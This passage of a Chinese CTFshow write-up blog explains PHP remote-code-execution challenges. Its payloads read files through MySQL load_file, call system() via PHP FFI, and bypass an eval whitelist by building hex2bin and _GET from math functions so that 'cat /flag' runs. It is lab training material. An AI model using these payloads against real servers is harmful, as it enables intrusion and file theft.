load_file)"></a>web75(Sql load_file)</h4><p>ÂèØ‰ª•Êü•Âà∞flag‰ΩçÁΩÆÔºö&#x2F;flag36.txt  ‰ΩÜÊòØincludeË¢´ban‰∫ÜÔºå‰πãÂâçÁöÑpocÂõ†‰∏∫strlenË¢´Á¶Å‰∫ÜËé∑Âèñ‰∏çÂà∞systemÂú∞ÂùÄ‰πüÊ≤°Ê≥ïÁî®‰∫Ü</p><p>ÂèØ‰ª•‰ΩøÁî®mysqlÁöÑload_fileÂáΩÊï∞</p><p>ÂÖàÊü•ËØ¢Êï∞ÊçÆÂ∫ì</p><pre class="language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token variable">$dsn</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"mysql:host=localhost;dbname=information_schema"</span><span class="token punctuation">;</span><span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token variable">$dsn</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$rs</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select database()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">## $rs = $db->query("select group_concat(SCHEMA_NAME) from SCHEMATA");</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$rs</span> <span class="token keyword">as</span> <span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"|"</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>Êü•Âà∞‰∫ÜctftrainingÁöÑÊï∞ÊçÆÂ∫ìÔºåÁÑ∂Âêé‰ΩøÁî®load_fileËØªÂèñflag</p><blockquote><pre class="language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token variable">$dbh</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'mysql:host=localhost;dbname=ctftraining'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$dbh</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'select load_file("/flag36.txt")'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"|"</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token variable">$dbh</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">PDOException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></blockquote><h4 id="web76"><a href="#web76" class="headerlink" title="web76"></a>web76</h4><p>PayloadÂêå‰∏ä</p><h4 id="web77-FFI-php7-4‰ª•‰∏ä"><a href="#web77-FFI-php7-4‰ª•‰∏ä" class="headerlink" title="web77(FFI php7.4‰ª•‰∏ä)"></a>web77(FFI php7.4‰ª•‰∏ä)</h4><p>FFIÔºåphp7.4‰ª•‰∏äÊâçÊúâ</p><p>Payload:</p><blockquote><p>$ffi &#x3D; FFI::cdef(‚Äúint system(const char *command);‚Äù);&#x2F;&#x2F;ÂàõÂª∫‰∏Ä‰∏™systemÂØπË±°<br>$a&#x3D;‚Äô&#x2F;readflag &gt; 1.txt‚Äô;   &#x2F;&#x2F;Ê≤°ÊúâÂõûÊòæÔºåÈúÄË¶ÅÈáçÂÆöÂêëÂà∞Êñá‰ª∂<br>$ffi-&gt;system($a);       &#x2F;&#x2F;ÈÄöËøá$ffiÂéªË∞ÉÁî®systemÂáΩÊï∞</p></blockquote><h4 id="web118-BashÂÜÖÁΩÆÂèòÈáè"><a href="#web118-BashÂÜÖÁΩÆÂèòÈáè" class="headerlink" title="web118(BashÂÜÖÁΩÆÂèòÈáè)"></a>web118(BashÂÜÖÁΩÆÂèòÈáè)</h4><p><img src="web118_3.png" loading="lazy"></p><h4 id="web119"><a href="#web119" class="headerlink" title="web119"></a>web119</h4><p><img src="web119_3.png" loading="lazy"></p><h4 id="web120"><a href="#web120" class="headerlink" title="web120"></a>web120</h4><p><img src="web120.png" loading="lazy"></p><h4 id="web121"><a href="#web121" class="headerlink" title="web121"></a>web121</h4><p><img src="web121.png" loading="lazy"></p><h4 id="web122"><a href="#web122" class="headerlink" title="web122"></a>web122</h4><p><img src="web122.png" loading="lazy"></p><h4 id="web124"><a href="#web124" class="headerlink" title="web124"></a>web124</h4><p>2019CISCNÂàùËµõÂéüÈ¢ò</p><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML"> &lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: Êî∂ÈõÜËá™ÁΩëÁªú# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-06 14:04:45*&#x2F;error_reporting(0);&#x2F;&#x2F;Âê¨ËØ¥‰Ω†ÂæàÂñúÊ¨¢Êï∞Â≠¶Ôºå‰∏çÁü•ÈÅì‰Ω†ÊòØÂê¶Áà±ÂÆÉËÉúËøáÁà±flagif(!isset($_GET[&#39;c&#39;]))&#123;    show_source(__FILE__);&#125;else&#123;    &#x2F;&#x2F;‰æãÂ≠ê c&#x3D;20-1    $content &#x3D; $_GET[&#39;c&#39;];    if (strlen($content) &gt;&#x3D; 80) &#123;        die(&quot;Â§™Èïø‰∫Ü‰∏ç‰ºöÁÆó&quot;);    &#125;    $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;];    foreach ($blacklist as $blackitem) &#123;        if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $content)) &#123;            die(&quot;ËØ∑‰∏çË¶ÅËæìÂÖ•Â•áÂ•áÊÄ™ÊÄ™ÁöÑÂ≠óÁ¨¶&quot;);        &#125;    &#125;    &#x2F;&#x2F;Â∏∏Áî®Êï∞Â≠¶ÂáΩÊï∞http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;php_ref_math.asp    $whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];    preg_match_all(&#39;&#x2F;[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*&#x2F;&#39;, $content, $used_funcs);      foreach ($used_funcs[0] as $func) &#123;        if (!in_array($func, $whitelist)) &#123;            die(&quot;ËØ∑‰∏çË¶ÅËæìÂÖ•Â•áÂ•áÊÄ™ÊÄ™ÁöÑÂáΩÊï∞&quot;);        &#125;    &#125;    &#x2F;&#x2F;Â∏Æ‰Ω†ÁÆóÂá∫Á≠îÊ°à    eval(&#39;echo &#39;.$content.&#39;;&#39;);&#125; </code></pre><p><strong>‰ª£Á†ÅÂÆ°ËÆ°</strong></p><p>‰ª£Á†ÅÊé•ÂèóGET‰º†ÂèÇ<code>c</code>Ôºå‰øùÂ≠òÂú®<code>content</code>‰∏≠ÔºåÂπ∂ÂØπÂèÇÊï∞ÈïøÂ∫¶ËøõË°å‰∫ÜÈôêÂà∂<code>&lt;80</code>„ÄÇ</p><p>ÁÑ∂ÂêéËÆæÁΩÆ‰∫Ü‰∏Ä‰∏™ÈªëÂêçÂçïÔºåËøáÊª§‰∫Ü‰∏Ä‰∫õÁâπÊÆäÂ≠óÁ¨¶Ôºå<code>Á©∫Ê†º</code>Âíå<code>/</code>‰πüÁªôËøáÊª§‰∫ÜÔºåÊâÄ‰ª•<code>cat /flag</code>Êó†Èó®„ÄÇ</p><p>Êé•‰∏ãÊù•Êèê‰æõ‰∫Ü‰∏Ä‰∏™ÁôΩÂêçÂçïÔºåÈáåÈù¢ÊòØ‰∏Ä‰∫õÊï∞Â≠¶ÂáΩÊï∞ÔºåÂπ∂Êèê‰æõ‰∫Ü‰∏Ä‰∏™Â∏∏Áî®Êï∞Â≠¶ÂáΩÊï∞ÁöÑÈìæÊé•ÔºåÂèØ‰ª•Êü•Âà∞Ëøô‰∫õÂáΩÊï∞ÁöÑÁî®Ê≥ï„ÄÇ</p><p>ÈÉΩÊª°Ë∂≥‰ª•‰∏äÊù°‰ª∂ÂêéÔºå‰ΩøÁî®<code>eval</code>Êù•ÊâßË°å‰º†ÂÖ•ÁöÑÂèÇÊï∞„ÄÇ</p><p>ÂàÜÊûêÂà∞ËøôÈáåÔºåÂè™ËÉΩÂà©Áî®ÁôΩÂêçÂçï‰∏≠Êèê‰æõÁöÑÂáΩÊï∞Êù•ÊûÑÈÄ†ÂëΩ‰ª§ÔºåÁî®Âà∞ÁöÑÂáΩÊï∞ÊúâÔºö</p><ul><li><code>base_convert()</code>ÔºöÂú®‰ªªÊÑèËøõÂà∂‰πãÈó¥ËΩ¨Êç¢Êï∞Â≠ó</li><li><code>dechex()</code>ÔºöÂ∞ÜÂçÅËøõÂà∂ËΩ¨Êç¢ÊàêÂçÅÂÖ≠ËøõÂà∂</li><li><code>hex2bin()</code>ÔºöÂ∞ÜÂçÅÂÖ≠ËøõÂà∂ËΩ¨Êç¢ÊàêasciiÂ≠óÁ¨¶</li></ul><p><strong>ÊÄùË∑ØÊòØÔºöÂÖàÂà©Áî®<code>dechex()</code>Â∞ÜGET‰º†ÂÖ•ÁöÑÂçÅËøõÂà∂Êï∞ËΩ¨Êç¢ÊàêÂçÅÂÖ≠ËøõÂà∂ÔºåÂÜçÂà©Áî®<code>hex2bin()</code>Â∞ÜÂæóÂà∞ÁöÑÂçÅÂÖ≠ËøõÂà∂Êï∞ËΩ¨Êç¢ÊàêasciiÂ≠óÁ¨¶‰∏≤„ÄÇÂèàÂõ†‰∏∫ÁôΩÂêçÂçïÈáåÊ≤°Êúâ<code>hex2bin()</code>Ëøô‰∏™ÂáΩÊï∞ÔºåÊâÄ‰ª•ÈúÄË¶ÅÂà©Áî®<code>base_convert()</code>Êù•Â∞ÜGET‰º†ÂÖ•ÁöÑÂçÅËøõÂà∂Êï∞ËΩ¨Êç¢Êàê‰∏âÂçÅÂÖ≠ËøõÂà∂ÔºàÂõ†‰∏∫‰∏âÂçÅÂÖ≠ËøõÂà∂‰∏≠Âê´ÊúâÊï∞Â≠óÂ≠óÊØçÔºâÊûÑÈÄ†Âá∫<code>hex2bin</code>ÔºåÊúÄÂêéÂ∞ÜÂàÜÂà´‰º†ÂÖ•ÁöÑÂ≠óÁ¨¶‰∏≤ÊãºÊé•Âç≥ÂèØÊûÑÈÄ†ÊàêÂäü„ÄÇ</strong></p><p>*TrickÔºöÂçÅËøõÂà∂Êï∞<code>37907361743</code>ËΩ¨Êç¢Êàê‰∏âÂçÅÂÖ≠ËøõÂà∂‰πãÂêéÊ≠£Â•ΩÂ∞±ÊòØ<code>hex2bin</code>„ÄÇ</p><p>Âõ†‰∏∫‰ª£Á†Å‰∏≠ÂØπ‰º†ÂÖ•ÁöÑÂèÇÊï∞<code>c</code>ÂÅö‰∫ÜÈïøÂ∫¶ÈôêÂà∂Ôºå‰ΩÜÂèØ‰ª•ÈÄöËøá‰º†ÂÖ•ÂÖ∂ÂÆÉÂèÇÊï∞ÔºåÂú®ÊûÑÈÄ†Âá∫Êù•ÁöÑËØ≠Âè•‰∏≠Ë∞ÉÁî®Âç≥ÂèØ„ÄÇ</p><p>ËøôÈáåËøòÊ∂âÂèäÂà∞‰∏Ä‰∏™Áü•ËØÜÁÇπÔºåPHP‰∏≠ÂèØ‰ª•Â∞ÜÂáΩÊï∞Âêç‰øùÂ≠òÂú®‰∏Ä‰∏™ÂèòÈáè‰∏≠ÔºåÁÑ∂Âêé‰ΩøÁî®Ëøô‰∏™ÂèòÈáèÊù•Êõø‰ª£ÂáΩÊï∞ÂêçÔºå‰æãÂ¶ÇÔºö</p><pre class="language-none"><code class="language-none">$a &#x3D; &#39;dechex&#39;;echo $a(10);&#x2F;&#x2F; a</code></pre><p>Âà©Áî®‰ª•‰∏äÁü•ËØÜÁÇπÔºåÂ∞ùËØïÊûÑÈÄ†Â¶Ç‰∏ãpayloadÔºö</p><pre class="language-none"><code class="language-none">?c&#x3D;$_GET[a]($_GET[b])&amp;a&#x3D;system&amp;b&#x3D;cat &#x2F;flag</code></pre><p>ÊûÑÈÄ†ËøáÁ®ãÂ¶Ç‰∏ãÔºö</p><pre class="language-none"><code class="language-none">base_convert(37907361743, 10, 36);&#x3D;&gt;hex2bindechex(1598506324);&#x3D;&gt;5f474554hex2bin(&#39;5f474554&#39;);&#x3D;&gt;_GET($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;) &#x3D;&gt; ($_GET)&#123;pi&#125;($_GET)&#123;abs&#125;  &#x2F;&#x2F;&#123;&#125;ÂèØ‰ª•‰ª£Êõø[]Áªº‰∏äÔºö$pi &#x3D; base_convert(37907361743, 10, 36);$pi &#x3D; $pi(dechex(1598506324));echo $pi;&#x2F;&#x2F; _GETÔºåÂç≥Ê≠§Êó∂ÁöÑ$piÂ∞±ÊòØ_GET</code></pre><p>ÊãºÊé•ÂΩ¢ÊàêpayloadÔºö</p><blockquote><p>?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi&#x3D;system&amp;abs&#x3D;cat%20&#x2F;flag</p></blockquote><blockquote><p>?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$$pi{pi}($$pi{abs})&amp;pi&#x3D;system&amp;abs&#x3D;cat flag.php</p><p>?c&#x3D;($pi&#x3D;base_convert)(22950,23,34)($pi(76478043844,9,34)(dechex(109270211257898)))</p><p>?c&#x3D;base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))</p><p>?c&#x3D;$pi&#x3D;(is_nan^(6).(4)).(tan^(1).(5));$pi&#x3D;$$pi;$pi{0}($pi{1})&amp;0&#x3D;system&amp;1&#x3D;cat%20flag.php</p><p>$pi&#x3D;base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1})<br>&#x2F;&#x2F;Ë¶ÅÂú®ËØ∑Ê±ÇÂ§¥ÈáåÈù¢Âä†‰∏Ä‰∏™  1:tac flag.php  ËßÅ‰∏ãÂõæ</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ÂÆâÂÖ®Áõ∏ÂÖ≥ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> Rce </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
